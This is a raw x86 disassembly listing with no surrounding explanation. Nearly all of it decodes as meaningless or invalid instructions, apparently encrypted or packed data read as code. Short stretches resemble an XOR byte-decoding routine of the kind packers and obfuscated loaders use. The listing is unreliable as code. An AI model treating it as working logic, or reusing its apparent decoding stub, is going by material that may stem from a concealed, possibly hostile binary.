  404ff2:	mov    ecx,0xa0ce464a
  404ff7:	ins    BYTE PTR es:[edi],dx
  404ff8:	cmp    dl,BYTE PTR [ecx+0x28]
  404ffb:	pop    es
  404ffc:	shr    BYTE PTR [ebp+0x2f0f12ca],0x4c
  405003:	js     0x40506b
  405005:	cmp    eax,0xaadf38e3
  40500a:	mov    ebx,0xf970ea98
  40500f:	jo     0x404fe7
  405011:	push   esi
  405012:	nop
  405013:	pop    edx
  405014:	and    al,0x32
  405016:	add    BYTE PTR [ecx+0x1f],cl
  405019:	test   DWORD PTR [esp-0x15],edi
  40501d:	iret   
  40501e:	stc    
  40501f:	jns    0x404fcc
  405021:	ja     0x405005
  405023:	fild   QWORD PTR [ecx+0x10]
  405026:	ret    0x8c1b
  405029:	daa    
  40502a:	push   ss
  40502b:	(bad)  
  40502c:	out    0x87,eax
  40502e:	loope  0x4050a8
  405030:	mov    cl,0x5e
  405032:	jle    0x404fcd
  405034:	xlat   BYTE PTR ds:[ebx]
  405035:	jge    0x40503a
  405037:	inc    ecx
  405038:	fst    st(5)
  40503a:	and    ebp,DWORD PTR [edx-0x35099878]
  405040:	lods   al,BYTE PTR ds:[esi]
  405041:	jmp    0x5590be14
  405046:	imul   ebx,esi,0xffffffc8
  405049:	pop    ds
  40504a:	mov    ah,0x3b
  40504c:	inc    edx
  40504d:	cmp    al,0x72
  40504f:	push   ecx
  405050:	pop    eax
  405051:	cdq    
  405052:	jmp    0x77d5:0xcf499ce5
  405059:	loop   0x4050a5
  40505b:	sub    DWORD PTR [edx-0x3a6a95f5],edi
  405061:	xchg   ebp,eax
  405062:	or     WORD PTR [edi-0x55],cx
  405066:	inc    esi
  405067:	iret   
  405068:	pop    ss
  405069:	fwait
  40506a:	enter  0x7d7e,0x86
  40506e:	mov    ecx,0x2b9a0ede
  405073:	inc    edi
  405074:	pushf  
  405075:	xchg   DWORD PTR [eax],esp
  405077:	nop
  405078:	dec    ebx
  405079:	jo     0x404ffb
  40507b:	(bad)  [eax]
  40507d:	fwait
  40507e:	cdq    
  40507f:	mov    bl,0x7a
  405081:	cmp    eax,0x233d31b7
  405086:	bswap  esi
  405088:	cs daa 
  40508a:	xchg   DWORD PTR [ebx-0x4],ecx
  40508d:	add    eax,0x1e9ba211
  405092:	clc    
  405093:	rcl    DWORD PTR [esi],cl
  405095:	inc    ebx
  405096:	fldcw  WORD PTR [esi+0x37c8cf61]
  40509c:	pop    ds
  40509d:	adc    ebp,ecx
  40509f:	ins    BYTE PTR es:[edi],dx
  4050a0:	ins    BYTE PTR es:[edi],dx
  4050a1:	adc    ch,BYTE PTR [eax-0x15566e35]
  4050a7:	retf   
  4050a8:	sbb    eax,0x8bc029eb
  4050ad:	fimul  WORD PTR [ebp+0x4b33614b]
  4050b3:	cdq    
  4050b4:	hlt    
  4050b5:	fisttp WORD PTR [eax+0x1632a3eb]
  4050bb:	aaa    
  4050bc:	int    0x88
  4050be:	ins    DWORD PTR es:[edi],dx
  4050bf:	mov    ah,0x4b
  4050c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4050c2:	lock xchg esp,eax
  4050c4:	mov    ebx,0x68bfdd8a
  4050c9:	(bad)  
  4050ca:	int    0xff
  4050cc:	sub    edi,eax
  4050ce:	add    edi,DWORD PTR [ebp+0x10]
  4050d1:	xor    edx,ecx
  4050d3:	add    edx,esi
  4050d5:	cmp    edx,edi
  4050d7:	ja     0x4059fd
  4050dd:	push   ebx
  4050de:	jmp    0x4053d8
  4050e3:	mov    esi,0x327298
  4050e8:	jmp    0x4053d8
  4050ed:	aas    
  4050ee:	rol    dh,1
  4050f0:	int3   
  4050f1:	aad    0xd2
  4050f3:	(bad)  
  4050f5:	dec    esp
  4050f6:	sub    BYTE PTR [ebx+0x6e1cfefe],bh
  4050fc:	jge    0x4050e6
  4050fe:	xor    BYTE PTR [eax+0x78],bh
  405101:	dec    ebp
  405102:	jle    0x40517c
  405104:	js     0x40509e
  405106:	ret    
  405107:	mov    edx,0x6b910717
  40510c:	retf   0xb9a6
  40510f:	jle    0x40517e
  405111:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405112:	dec    eax
  405113:	retf   0x3610
  405116:	mov    ss,WORD PTR ds:0x764dab8b
  40511c:	push   es
  40511d:	imul   ecx,DWORD PTR [esi],0x23
  405120:	adc    eax,0xa7ca57ef
  405125:	jmp    0xc4c2a804
  40512a:	iret   
  40512b:	sahf   
  40512c:	pop    edi
  40512d:	mov    al,ds:0x70fb2a6e
  405132:	stos   DWORD PTR es:[edi],eax
  405133:	dec    esi
  405134:	popf   
  405135:	mov    edx,0x608b24f6
  40513a:	scas   al,BYTE PTR es:[edi]
  40513b:	dec    ebp
  40513c:	xor    al,0x70
  40513e:	imul   ecx,DWORD PTR [edi-0x32],0x77
  405142:	and    al,BYTE PTR [ecx-0x13]
  405145:	add    DWORD PTR [ecx],0xee7f5a9f
  40514b:	or     eax,0x1a22552f
  405150:	sbb    eax,0x82af04c8
  405155:	test   esp,edi
  405157:	cmp    eax,DWORD PTR [ebp+0x32]
  40515a:	out    0xf1,al
  40515c:	push   eax
  40515d:	daa    
  40515e:	jae    0x4050e6
  405160:	lahf   
  405161:	not    DWORD PTR [ebx+0xf]
  405164:	ret    0xa73f
  405167:	add    ebp,DWORD PTR [ebx-0x2a]
  40516a:	cwde   
  40516b:	dec    ebp
  40516c:	push   ss
  40516d:	loope  0x405101
  40516f:	ret    
  405170:	add    BYTE PTR [ebx+0x2b118872],0x5c
  405177:	push   cs
  405178:	lea    esp,[ecx+0x31]
  40517b:	lock stos DWORD PTR es:[edi],eax
  40517d:	or     edx,DWORD PTR [edx+0x6e]
  405180:	xchg   DWORD PTR [ebx-0x5a],ecx
  405183:	icebp  
  405184:	xor    bh,dl
  405186:	push   edi
  405187:	(bad)  
  405188:	jo     0x405160
  40518a:	stc    
  40518b:	push   eax
  40518c:	in     eax,0xd7
  40518e:	jmp    0x4051da
  405190:	gs cwde 
  405192:	add    cl,ch
  405194:	test   al,0x59
  405196:	icebp  
  405197:	push   eax
  405198:	sub    esi,DWORD PTR [esi-0x72bf65d0]
  40519e:	xor    DWORD PTR [esp+ebx*8],0x2f453c8f
  4051a5:	mov    edx,0xcb735b62
  4051aa:	call   0x5133:0x3ac6a765
  4051b1:	out    0xd4,eax
  4051b3:	adc    DWORD PTR [edx+ebx*4],eax
  4051b6:	mov    ss,WORD PTR [ecx]
  4051b8:	and    eax,DWORD PTR [esi]
  4051ba:	push   0xab9181d3
  4051bf:	stc    
  4051c0:	cdq    
  4051c1:	xchg   ebp,eax
  4051c2:	rol    BYTE PTR [edi+eiz*4-0x2d769156],0x5
  4051ca:	clc    
  4051cb:	sbb    BYTE PTR [esi+0x4b],ah
  4051ce:	bound  edi,QWORD PTR [edx+eiz*2+0x4d]
  4051d2:	fst    DWORD PTR [ecx-0x30]
  4051d5:	into   
  4051d6:	scas   al,BYTE PTR es:[di]
  4051d8:	scas   eax,DWORD PTR es:[edi]
  4051d9:	stos   BYTE PTR es:[edi],al
  4051da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4051db:	enter  0x52e9,0x3e
  4051df:	mov    eax,0x99499ca6
  4051e4:	retf   0x38f3
  4051e7:	pop    ebx
  4051e8:	push   ds
  4051e9:	(bad)  
  4051ea:	stc    
  4051eb:	mov    cl,0x32
  4051ed:	or     al,0x59
  4051ef:	add    al,0x9b
  4051f1:	out    dx,eax
  4051f2:	push   0xfe5c3cd8
  4051f7:	dec    ebp
  4051f8:	sbb    eax,0x616ea6aa
  4051fd:	mov    eax,0xc8ea9efa
  405202:	mov    esi,0x315b463e
  405207:	inc    ebp
  405208:	add    edx,DWORD PTR [ebx+0x608f7077]
  40520e:	push   0xffffff80
  405210:	pop    edx
  405211:	adc    eax,0xa42a40
  405216:	call   0x11100928
  40521b:	fstp   QWORD PTR [edx+0x2f2391bc]
  405221:	inc    edi
  405222:	pop    eax
  405223:	out    dx,eax
  405224:	les    ebx,FWORD PTR [ebx+0x1afa1bcf]
  40522a:	dec    esi
  40522b:	pop    esi
  40522c:	jle    0x4051d4
  40522e:	test   al,0xb4
  405230:	pop    esp
  405231:	push   ds
  405232:	push   esi
  405233:	mov    bh,0x9b
  405235:	add    DWORD PTR [edi],ebp
  405237:	cmp    al,0x21
  405239:	in     al,dx
  40523a:	sbb    ecx,DWORD PTR [ecx]
  40523c:	ret    0x2a30
  40523f:	pushf  
  405240:	mov    bl,0x31
  405242:	adc    eax,0x9a268e89
  405247:	pop    esp
  405248:	push   0x4f
  40524a:	sahf   
  40524b:	imul   ebx,edx,0x53
  40524e:	xor    ch,BYTE PTR [ecx-0x73a90f9c]
  405254:	lock push ebx
  405256:	mov    ecx,0x8f27c974
  40525b:	push   ss
  40525c:	loopne 0x4052bc
  40525e:	add    esp,DWORD PTR fs:[ebx+0xc]
  405262:	mov    esp,0xd72efc3d
  405267:	xchg   edx,eax
  405268:	popa   
  405269:	addr16 jnp 0x4052a6
  40526c:	repnz (bad) 
  40526e:	push   edx
  40526f:	push   cs
  405270:	xor    eax,0x78b40231
  405275:	test   BYTE PTR [edx+0x3c],ch
  405278:	pop    esi
  405279:	cmp    ch,BYTE PTR [ebx+0x6a]
  40527c:	jo     0x4052cc
  40527e:	xlat   BYTE PTR ds:[ebx]
  40527f:	iret   
  405280:	lock js 0x405219
  405283:	xchg   esi,eax
  405284:	adc    dh,dh
  405286:	jb     0x405223
  405288:	scas   eax,DWORD PTR es:[edi]
  405289:	adc    DWORD PTR [edx+0x55],esi
  40528c:	xchg   BYTE PTR [edx+0x61],bl
  40528f:	mov    ebp,ds
  405291:	js     0x405300
  405293:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405294:	stos   BYTE PTR es:[edi],al
  405295:	sar    DWORD PTR [ecx+0x5a65ed95],0xa5
  40529c:	mov    ebp,0x73c83e13
  4052a1:	sub    dh,BYTE PTR [ecx]
  4052a3:	daa    
  4052a4:	dec    edi
  4052a5:	dec    esi
  4052a6:	and    dh,BYTE PTR [ebp+0x3f]
  4052a9:	jmp    FWORD PTR [esi+ecx*1+0x77]
  4052ad:	shr    DWORD PTR [edi-0x6],cl
  4052b0:	stos   BYTE PTR es:[edi],al
  4052b1:	mov    WORD PTR [eax-0x5ce4a816],cs
  4052b7:	(bad)  [ebp+eiz*8+0x15]
  4052bb:	movsx  esp,WORD PTR [eax-0x174845b5]
  4052c2:	cmp    DWORD PTR [eax-0x16],0xffffff89
  4052c6:	imul   ecx,DWORD PTR [si-0x79],0xffffffa9
  4052cb:	cwde   
  4052cc:	pop    ss
  4052cd:	pusha  
  4052ce:	mov    DWORD PTR [edx],ebx
  4052d0:	pop    ebx
  4052d1:	test   ch,0xf8
  4052d4:	cmp    cl,BYTE PTR [ecx-0x44052a67]
  4052da:	aam    0x4
  4052dc:	pop    ebx
  4052dd:	inc    esi
  4052de:	out    0xd7,al
  4052e0:	add    ah,bh
  4052e2:	jno    0x4052d1
  4052e4:	jp     0x405290
  4052e6:	stc    
  4052e7:	xor    eax,0xa347318
  4052ec:	daa    
  4052ed:	out    dx,al
  4052ee:	push   ecx
  4052ef:	push   esp
  4052f0:	(bad)  
  4052f1:	and    eax,0x241c0140
  4052f6:	mov    ebx,0xff2a14cb
  4052fb:	cmp    eax,0x530c1014
  405300:	daa    
  405301:	xchg   DWORD PTR [ecx+0x70],ecx
  405304:	outs   dx,BYTE PTR ds:[esi]
  405305:	call   0xc666:0x266c58b8
  40530c:	pop    ds
  40530d:	add    bl,dl
  40530f:	pop    ebp
  405310:	loopne 0x40530a
  405312:	pop    ebx
  405313:	jb     0x4052a8
  405315:	dec    edx
  405316:	pop    esp
  405317:	sub    eax,0x5fbe67ab
  40531c:	inc    ecx
  40531d:	xor    eax,0x9e727425
  405322:	mov    bh,0x32
  405324:	pop    esp
  405325:	int    0x35
  405327:	aam    0x74
  405329:	inc    esp
  40532a:	jge    0x405353
  40532c:	push   cs
  40532d:	jle    0x405321
  40532f:	lahf   
  405330:	pop    edx
  405331:	mov    ?,WORD PTR [ecx+edi*8-0x4c]
  405335:	iret   
  405336:	xor    eax,0x6e32db9
  40533b:	push   eax
  40533c:	mov    esp,0xfb4d5199
  405341:	push   ebx
  405342:	cld    
  405343:	jno    0x40536c
  405345:	and    edx,esi
  405347:	mov    ebx,0xef53c4
  40534c:	and    eax,DWORD PTR [ebx+0x29]
  40534f:	jge    0x40538d
  405351:	retf   0xd000
  405354:	mov    dl,0xef
  405356:	sar    BYTE PTR cs:[esi],0x24
  40535a:	xchg   ecx,eax
  40535b:	xor    eax,0x8786d0c8
  405360:	sbb    DWORD PTR [ecx+0x6f],esi
  405363:	inc    eax
  405364:	(bad)  
  405365:	in     eax,dx
  405366:	jnp    0x40532a
  405368:	mov    ah,0x81
  40536a:	arpl   WORD PTR [edi],di
  40536c:	mov    ebp,0xc2841d35
  405371:	push   edi
  405372:	(bad)  
  405373:	cwde   
  405374:	pop    eax
  405375:	and    eax,0xce38c3f6
  40537a:	adc    eax,DWORD PTR [eax+0x2a5a4955]
  405380:	mov    ecx,0xae5eb2c7
  405385:	(bad)  
  405386:	xchg   edi,eax
  405387:	(bad)  [ebx+0x6e]
  40538a:	icebp  
  40538b:	inc    edx
  40538c:	add    al,0x7b
  40538e:	mov    ah,BYTE PTR [esi-0x76]
  405391:	jnp    0x40535b
  405393:	mov    ah,al
  405395:	iret   
  405396:	sub    BYTE PTR [edx-0x5590597a],0x1e
  40539d:	jb     0x405361
  40539f:	push   cs
  4053a0:	rol    DWORD PTR [ebp-0x10259c54],1
  4053a6:	shl    DWORD PTR [esi+0x71],0x30
  4053aa:	inc    ecx
  4053ab:	pop    ss
  4053ac:	neg    BYTE PTR [esi+0xdcf3004]
  4053b2:	in     eax,0x55
  4053b4:	and    ch,BYTE PTR [esi+esi*2-0x66]
  4053b8:	in     eax,dx
  4053b9:	mov    edi,0x45be7ff9
  4053be:	pop    ebx
  4053bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053c0:	sbb    dh,ah
  4053c2:	aas    
  4053c3:	iret   
  4053c4:	jne    0x4053ca
  4053c6:	pusha  
  4053c7:	cdq    
  4053c8:	jg     0x40540d
  4053ca:	fld    TBYTE PTR [ecx+ecx*2-0x51132d7d]
  4053d1:	scas   eax,DWORD PTR es:[edi]
  4053d2:	aad    0xc6
  4053d4:	mov    DWORD PTR [ebp+0x458b8a1a],eax
  4053da:	clc    
  4053db:	jmp    0x4056cb
  4053e0:	int    0xd3
  4053e2:	rol    ah,cl
  4053e4:	ror    cl,cl
  4053e6:	aad    0xd9
  4053e8:	inc    edx
  4053e9:	jecxz  0x40544a
  4053eb:	fsubr  QWORD PTR [ecx-0x46]
  4053ee:	mov    eax,ds:0x78353d39
  4053f3:	js     0x405442
  4053f5:	jle    0x40546f
  4053f7:	js     0x405423
  4053f9:	mov    ecx,0x10ffe34a
  4053fe:	cli    
  4053ff:	into   
  405400:	pop    eax
  405401:	mov    bl,0xa3
  405403:	xor    esi,esp
  405405:	cdq    
  405406:	dec    edx
  405407:	loop   0x4053dd
  405409:	pop    ebp
  40540a:	mov    al,0xd2
  40540c:	or     al,ch
  40540e:	push   0xbc6c7bb5
  405413:	ins    DWORD PTR es:[edi],dx
  405414:	dec    eax
  405415:	bsf    esi,DWORD PTR [edi+0x10]
  405419:	daa    
  40541a:	jp     0x405449
  40541c:	dec    ebx
  40541d:	sub    al,0xd8
  40541f:	push   cs
  405420:	mov    WORD PTR [ecx+0x4bd58955],fs
  405426:	fstp   TBYTE PTR [ebx+0xe]
  405429:	loopne 0x4053e1
  40542b:	imul   ecx,DWORD PTR [ebp+ebp*4-0x36],0x2b72a90f
  405433:	jo     0x40547d
  405435:	loop   0x405409
  405437:	xchg   ebp,eax
  405438:	xchg   ebp,eax
  405439:	mov    eax,ds:0x337672dc
  40543e:	mov    dl,0x8a
  405440:	cs hlt 
  405442:	aad    0xd6
  405444:	in     al,0xa7
  405446:	(bad)  
  405448:	in     eax,dx
  405449:	(bad)  
  40544b:	dec    ebx
  40544c:	and    al,bh
  40544e:	ja     0x405463
  405450:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405451:	std    
  405452:	aas    
  405453:	(bad)  
  405454:	std    
  405455:	ret    
  405456:	ins    DWORD PTR es:[edi],dx
  405457:	outs   dx,DWORD PTR ds:[esi]
  405458:	dec    ebp
  405459:	(bad)  
  40545b:	hlt    
  40545c:	int    0x36
  40545e:	sub    ebp,edi
  405460:	xor    BYTE PTR [ebp+ebx*8+0x703c4588],dl
  405467:	jmp    0xa3e9dfa5
  40546c:	sti    
  40546d:	repz out dx,eax
  40546f:	adc    BYTE PTR [edx+0x2afef846],bl
  405475:	addr16 add ebp,edx
  405478:	jnp    0x4054b0
  40547a:	xchg   ebp,eax
  40547b:	cmp    eax,0x449fc9f1
  405480:	fild   WORD PTR [ecx-0x75]
  405483:	cmp    al,0xb
  405485:	icebp  
  405486:	fistp  QWORD PTR [edx+0x5b03e41c]
  40548c:	jb     0x405461
  40548e:	icebp  
  40548f:	loope  0x40541d
  405491:	lds    esi,FWORD PTR [eax-0x470b7871]
  405497:	jecxz  0x40544d
  405499:	fs dec ebp
  40549b:	inc    esp
  40549c:	lods   eax,DWORD PTR ds:[esi]
  40549d:	adc    DWORD PTR [ebp+0x6d],esp
  4054a0:	arpl   WORD PTR [ebx],cx
  4054a2:	repz dec esi
  4054a4:	push   eax
  4054a5:	inc    ecx
  4054a6:	sub    ch,BYTE PTR ds:0x2b936a90
  4054ac:	(bad)  
  4054ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4054ae:	pop    ss
  4054af:	jns    0x4054ab
  4054b1:	pop    eax
  4054b2:	push   0x2f216d75
  4054b7:	int    0xdb
  4054b9:	mov    bh,0xd9
  4054bb:	cmp    cl,BYTE PTR [ebx-0x25]
  4054be:	xchg   ecx,eax
  4054bf:	jo     0x40548c
  4054c1:	into   
  4054c2:	adc    BYTE PTR [edx-0x10],al
  4054c5:	mov    al,0x59
  4054c7:	out    0x71,eax
  4054c9:	xchg   esp,eax
  4054ca:	or     esp,DWORD PTR [edi]
  4054cc:	push   ebp
  4054cd:	push   es
  4054ce:	or     eax,0x6568fed7
  4054d3:	sahf   
  4054d4:	and    ebp,ecx
  4054d6:	mov    ch,dh
  4054d8:	loop   0x405543
  4054da:	mov    esi,0x224835a8
  4054df:	aas    
  4054e0:	ret    0xdfca
  4054e3:	ins    BYTE PTR es:[edi],dx
  4054e4:	mov    es,WORD PTR [eax+0x32]
  4054e7:	adc    ebx,edi
  4054e9:	adc    ecx,DWORD PTR [ecx-0x2c]
  4054ec:	inc    esi
  4054ed:	add    ebx,esi
  4054ef:	aam    0x43
  4054f1:	adc    al,0xe6
  4054f3:	or     al,0x91
  4054f5:	idiv   DWORD PTR [esi+edi*4]
  4054f8:	and    al,0x88
  4054fa:	test   al,0x23
  4054fc:	mov    esi,0x7ea0bf0d
  405501:	inc    edi
  405502:	pop    ebp
  405503:	(bad)  
  405504:	push   cs
  405505:	jecxz  0x40555d
  405507:	cmp    bl,BYTE PTR [eax+0x59]
  40550a:	xchg   ebp,eax
  40550b:	in     eax,dx
  40550c:	dec    esp
  40550e:	popf   
  40550f:	jge    0x405573
  405511:	push   eax
  405512:	xor    BYTE PTR [esi+0xba8058],cl
  405518:	outs   dx,BYTE PTR ds:[esi]
  405519:	jmp    0x859f:0x4d8cc7ff
  405520:	dec    ecx
  405521:	rcr    BYTE PTR [ecx],1
  405523:	push   0xf071f2ba
  405528:	popa   
  405529:	aad    0xab
  40552b:	shr    DWORD PTR ds:0x6b883615,cl
  405531:	dec    edx
  405532:	lahf   
  405533:	pop    ebp
  405534:	or     eax,0xd84147bd
  405539:	aaa    
  40553a:	mov    DWORD PTR [edx-0x6edff3e4],eax
  405540:	or     BYTE PTR [esp+eiz*2+0x29],cl
  405544:	pop    ebx
  405545:	mov    eax,0x6ee03c55
  40554a:	mov    esi,0xb04f0afc
  40554f:	mov    DWORD PTR [ebx+0x41],ebp
  405552:	fstp   TBYTE PTR [ecx]
  405554:	pop    eax
  405555:	cdq    
  405556:	js     0x405538
  405558:	fisubr WORD PTR [ebx+eiz*1]
  40555b:	mov    esi,0xefbdf202
  405560:	jmp    0x405532
  405562:	inc    edi
  405563:	sub    esp,DWORD PTR [edi-0x35241b74]
  405569:	and    al,0x9b
  40556b:	das    
  40556c:	pop    es
  40556d:	add    BYTE PTR [eax+0x21aad7e8],dl
  405573:	inc    eax
  405574:	push   ss
  405575:	ror    DWORD PTR [esi-0x5e],cl
  405578:	jae    0x40557f
  40557a:	jnp    0x40556c
  40557c:	stos   DWORD PTR es:[edi],eax
  40557d:	dec    edx
  40557e:	push   esp
  40557f:	cli    
  405580:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405581:	xchg   esp,eax
  405582:	cdq    
  405583:	or     edx,eax
  405585:	rol    esp,1
  405587:	xlat   BYTE PTR ds:[ebx]
  405588:	or     BYTE PTR [ebx-0x5b],bl
  40558b:	pop    ebx
  40558c:	mov    WORD PTR [edx],ds
  40558e:	rcr    BYTE PTR [esi+esi*8-0x44],0x69
  405593:	jb     0x405517
  405595:	cmp    BYTE PTR [esi+0x3b604cdf],cl
  40559b:	cdq    
  40559c:	jecxz  0x40555d
  40559e:	mov    ebx,0x8def679e
  4055a3:	and    BYTE PTR [ebx+0x60],dh
  4055a6:	sahf   
  4055a7:	mov    bl,0x4b
  4055a9:	das    
  4055aa:	(bad)  
  4055ab:	jno    0x405534
  4055ad:	icebp  
  4055ae:	add    al,0xa9
  4055b0:	jl     0x4055d3
  4055b2:	cld    
  4055b3:	not    BYTE PTR [esi+0xc8ccbb2]
  4055b9:	loop   0x405564
  4055bb:	jl     0x40555c
  4055bd:	fnsave [ebx]
  4055bf:	outs   dx,BYTE PTR ds:[esi]
  4055c0:	pusha  
  4055c1:	or     DWORD PTR [edx+esi*4-0xa279a43],0xffffffb8
  4055c9:	jne    0x4055fb
  4055cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4055cc:	or     eax,0xbcc3572d
  4055d1:	scas   al,BYTE PTR es:[edi]
  4055d2:	pop    ebx
  4055d3:	mov    cl,0x25
  4055d5:	(bad)  
  4055d6:	push   ebp
  4055d7:	ds js  0x4055b4
  4055da:	in     eax,0xb2
  4055dc:	mov    edi,0x908d4c99
  4055e1:	das    
  4055e2:	adc    esi,DWORD PTR [ebx]
  4055e4:	cmp    ebx,DWORD PTR [edi+0x50]
  4055e7:	and    dl,dl
  4055e9:	jmp    0x4055f2
  4055eb:	das    
  4055ec:	xchg   edx,eax
  4055ed:	cmp    ch,bh
  4055ef:	sbb    BYTE PTR [esi],dh
  4055f1:	dec    edx
  4055f2:	test   al,0xbb
  4055f4:	mov    edi,0xe8119d9d
  4055f9:	or     BYTE PTR [ebp-0x2f],0xcb
  4055fd:	(bad)  
  4055fe:	mov    ebx,0xf14268cd
  405603:	add    DWORD PTR [ebx-0x48],esp
  405606:	cmp    dl,ch
  405608:	jp     0x405612
  40560a:	mov    ds:0x382330fe,eax
  40560f:	or     DWORD PTR [ecx+0x7598afd3],esp
  405615:	mov    ebp,0x5e59e305
  40561a:	jl     0x405686
  40561c:	jmp    0xb8babeb5
  405621:	rcl    ebx,cl
  405623:	jmp    0x4055da
  405625:	stc    
  405626:	jo     0x4055f7
  405628:	and    eax,0xfcff2f59
  40562d:	adc    al,0xdb
  40562f:	push   0x32
  405631:	test   al,0xe9
  405633:	dec    ecx
  405634:	nop
  405635:	sub    ah,ah
  405637:	adc    al,0xd1
  405639:	js     0x40562b
  40563b:	bound  edi,QWORD PTR [ebx+edi*4-0x4]
  40563f:	mov    ebp,0xbc9b2777
  405644:	fxch   st(3)
  405646:	inc    ecx
  405647:	sbb    al,0x66
  405649:	push   esp
  40564a:	call   0x8bb2:0xc26e7ddd
  405651:	outs   dx,BYTE PTR fs:[esi]
  405653:	cmp    dh,BYTE PTR ds:0x811159f9
  405659:	les    ebp,FWORD PTR [ebx]
  40565b:	pop    ds
  40565c:	and    DWORD PTR [esi],esp
  40565e:	outs   dx,DWORD PTR ds:[esi]
  40565f:	sti    
  405660:	pop    es
  405661:	cld    
  405662:	or     eax,0x2dc4f38a
  405667:	loope  0x405672
  405669:	mov    DWORD PTR [edx+0x2],edx
  40566c:	jbe    0x405691
  40566e:	stos   BYTE PTR es:[edi],al
  40566f:	mov    al,0x34
  405671:	lea    eax,[ebx-0x73980007]
  405677:	dec    esi
  405678:	hlt    
  405679:	xchg   ebp,eax
  40567a:	or     DWORD PTR [edx+0x2e],esi
  40567d:	int3   
  40567e:	dec    eax
  40567f:	repnz cwde 
  405681:	push   es
  405682:	cli    
  405683:	repz pop DWORD PTR [ecx-0x3ae09f8d]
  40568a:	sub    cl,BYTE PTR [eax]
  40568c:	xor    al,0x60
  40568e:	add    bh,bl
  405690:	fmul   st,st(0)
  405692:	fist   WORD PTR [edi+0x67]
  405695:	cmp    al,0x32
  405697:	(bad)  
  405698:	imul   eax,DWORD PTR [ebx+0x2a],0xffffffc3
  40569c:	jp     0x405656
  40569e:	ja     0x40565e
  4056a0:	mov    al,0xe
  4056a2:	imul   edi,DWORD PTR [ebx],0x0
  4056a5:	jne    0x40562e
  4056a7:	ins    DWORD PTR es:[edi],dx
  4056a8:	adc    al,0xf6
  4056aa:	push   es
  4056ab:	nop
  4056ac:	jle    0x405704
  4056ae:	retf   0xc4ba
  4056b1:	pushf  
  4056b2:	arpl   WORD PTR [edi],bp
  4056b4:	pop    ds
  4056b5:	mov    edi,0x8d65914c
  4056ba:	xchg   esp,eax
  4056bb:	test   eax,0x9e57f978
  4056c0:	mov    bh,0x9b
  4056c2:	inc    edi
  4056c3:	mov    eax,0xf405f1b5
  4056c8:	call   0x33fc:0x7d8b93ac
  4056cf:	stc    
  4056d0:	add    edi,esi
  4056d2:	mov    esi,DWORD PTR [ebp+0x8]
  4056d5:	imul   edi,edx
  4056d8:	mov    ebx,DWORD PTR [ebp+0xc]
  4056db:	xor    eax,ecx
  4056dd:	add    eax,edx
  4056df:	mov    al,BYTE PTR [ebx+eax*1+0x327298]
  4056e6:	mov    BYTE PTR [edi+esi*1],al
  4056e9:	mov    eax,DWORD PTR [ebp-0x4]
  4056ec:	xor    eax,ecx
  4056ee:	lea    edx,[edx+eax*1+0x327298]
  4056f5:	mov    eax,DWORD PTR [ebp-0x4]
  4056f8:	xor    eax,ecx
  4056fa:	mov    esi,0xffcd8d68
  4056ff:	sub    esi,eax
  405701:	jmp    0x4059f1
  405706:	rol    esi,cl
  405708:	retf   0xd9c2
  40570b:	ret    0xd5db
  40570e:	shr    DWORD PTR [edx],0xd2
  405711:	ins    BYTE PTR es:[edi],dx
  405712:	jbe    0x405711
  405714:	(bad)  
  405715:	in     al,0x12
  405717:	cmp    bh,BYTE PTR [eax+0x78]
  40571a:	dec    ebp
  40571b:	jle    0x405795
  40571d:	js     0x4056af
  40571f:	ucomiss xmm1,xmm1
  405722:	add    al,BYTE PTR [esp+eiz*4+0x3684fb43]
  405729:	stc    
  40572a:	cli    
  40572b:	fiadd  WORD PTR [esi+0x1b]
  40572e:	int    0xe5
  405730:	lahf   
  405731:	inc    edx
  405732:	pop    eax
  405733:	ror    DWORD PTR [ecx],cl
  405735:	loope  0x405723
  405737:	dec    ecx
  405738:	mov    gs,eax
  40573a:	xor    eax,0xb3531e91
  40573f:	scas   al,BYTE PTR es:[edi]
  405740:	pushf  
  405741:	cmp    DWORD PTR [edi+0x61],0xc8f3b9f7
  405748:	or     eax,0x248d1d99
  40574d:	fst    QWORD PTR [edx-0x13a63e1f]
  405753:	mov    WORD PTR [esi-0x7e32a84e],cs
  405759:	pop    edx
  40575a:	push   esp
  40575b:	retf   0x38e5
  40575e:	fwait
  40575f:	and    BYTE PTR [ecx+ebp*8-0x37],cl
  405763:	xchg   ebx,eax
  405764:	xchg   edi,eax
  405765:	inc    edx
  405766:	push   ecx
  405767:	(bad)  
  405768:	loope  0x405733
  40576a:	jmp    0x1b145e7e
  40576f:	das    
  405770:	out    0x47,eax
  405772:	xchg   ebp,eax
  405773:	aaa    
  405774:	add    ecx,eax
  405776:	push   0xa97462f3
  40577b:	loop   0x4057b5
  40577d:	sbb    BYTE PTR [edx-0x7bc2c929],ch
  405783:	push   es
  405784:	outs   dx,BYTE PTR ds:[esi]
  405785:	cld    
  405786:	mov    ch,0xcf
  405788:	inc    eax
  405789:	sbb    al,0x22
  40578b:	xor    BYTE PTR [edi-0x23b24f14],0x52
  405792:	xor    DWORD PTR [ebx-0x5d2203a9],ecx
  405798:	jne    0x4057a1
  40579a:	jns    0x405769
  40579c:	shr    BYTE PTR [eax-0x373128d9],0xd7
  4057a3:	push   cs
  4057a4:	ins    DWORD PTR es:[edi],dx
  4057a5:	mov    ch,0x39
  4057a7:	out    dx,al
  4057a8:	xchg   ebp,eax
  4057a9:	mov    ebx,fs
  4057ab:	in     eax,0x86
  4057ad:	jo     0x4057d1
  4057af:	inc    esp
  4057b0:	xchg   ecx,eax
  4057b1:	popa   
  4057b2:	or     edi,DWORD PTR [edi+esi*4+0x2a]
  4057b6:	aaa    
  4057b7:	nop
  4057b8:	popf   
  4057b9:	sbb    al,0x22
  4057bb:	sbb    bl,bh
  4057bd:	int3   
  4057be:	cmp    al,0xf0
  4057c0:	das    
  4057c1:	adc    eax,0x46407649
  4057c6:	(bad)
  4057c9:	add    ecx,eax
  4057cb:	rcr    BYTE PTR [esp+edx*1+0x18],cl
  4057cf:	pop    esp
  4057d0:	xchg   ecx,eax
  4057d1:	mov    ecx,0x48599e8a
